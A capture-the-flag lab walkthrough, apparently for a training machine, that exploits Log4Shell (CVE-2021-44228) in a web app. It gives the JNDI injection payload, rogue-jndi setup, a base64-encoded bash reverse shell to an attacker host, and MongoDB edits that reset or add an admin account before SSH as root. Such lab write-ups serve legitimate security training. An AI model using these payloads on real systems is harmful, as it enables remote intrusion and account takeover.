Log4j vulnerability (CVE-2021-44228)

First : Enumeration

command: sudo nmap -sC -sV target_ip

there will be 22, 6789, 8080, 8443,
Pointing the browser to https://10.129.109.11:8443 reveals a login page.
#hint: ssl for secure sockets layer, tls for transport layer security, and use "https" for browsing the webapp with ssl or tls.

Second : Check the vulnerability

1.use burp proxy browser to intercept the package.
2.edit the data of "remember" : "${jndi:ldap://{attacker_ip}/whatever}"
3.listen on 389 port for check the action is actable or not.
command : sudo tcpdump -i tun0 port 389
if there are message from target_ip, it would be able to use the vulnerability

Third : get the shell

we need to install maven (rogue-jndi compiler)
command : sudo apt-get install maven (mvn)
rogue-jndi is a LDAP Server to accept the target sever connection request.
command : git clone https://github.com/veracode-research/rogue-jndi
command : cd rogue-jndi && mvn package

To look up the useful parameter in RogueJndi-1.1.jar (under the target dir)
command : java -jar RogueJndi-1.1.jar --help

we can use  -c flag to request system command.
At the same time, we need to encode our command for ensuring the transport success.
command : echo "/bin/bash -c '/bin/bash -i >&/dev/tcp/attacker_ip/port 0>&1'" | base64

and then to use RogueJndi-1.1.jar to send the command to target.
command : java -jar RogueJndi-1.1.jar -c "bash -c {echo,the command encoding with base64}|{base64,-d}|{bash,-i}" -hostname "attacker_ip"

remember to netcat listen on the port. (you prepare to reverse shell on)
command : nc -lnvp port

send the payload with the modified data.
data : "remember" : "${jndi:ldap://attacker_ip:1389/o=tomcat}"

Fourth : Privilege Escalation

to see the process in the system
command : ps aux

there is a mongodb on port 27117 (mongodb is a NOsql database)
we can use the command to see the db user data.
command : mongo --port 27117
>show dbs
>ace
>db.admin.find()

we can find the "administrator" account but its password is encoded with sha512.
we can brute force it with hash or modify it with another "password" or even to add a new account with admin privilege.

1. brute force is a low cp option.
2. it maybe a fast option but it could be found.
3. it would be a high cp option but also more step to complete it.

Modify the password step:
1. create a sha-512 password
command : mkpasswd -m sha-512 password_you_want
2. update the password of the administrator account
command : mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("the_code_admin_id")},{$set:{"x_shadow":"the_code_you_create_password"}})'
3. check the result : WriteResult({"nMatched" : 1, "nUpserted" : 0, "nModified" : 1})

Insert a new account :
1. create a sha-512 password
2. insert the account
command : mongo --port 27117 ace --eval 'db.admin.insert({"email" : "account@localhost.local", "last_site_name" : "default", "name" : "account", "time_created" : NumberLong(100019800), "x_shadow" : "the_code_you_create_password"})'
3. research the info of account info
command : mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson)'
4. research the info of web site
command : mongo --port 27117 ace --eval 'db.site.find().forEach(printjson)'
5.add the admin privilege to our new created account.
command : mongo --port 27117 ace --eval 'db.privilege.insert({"admin_id":"the_id_of_new_account", "permissions" : [], "role" : "admin", "site_id" : "the_id_of_web_site"})'

when you complete one of the above options, you can login the webapp with admin privilege.
and then to the setting and find the ssh account and password.
go ssh it and success to escalate the privilege.

command : ssh root@target_ip

surf the machine and find out the flag of root and user.

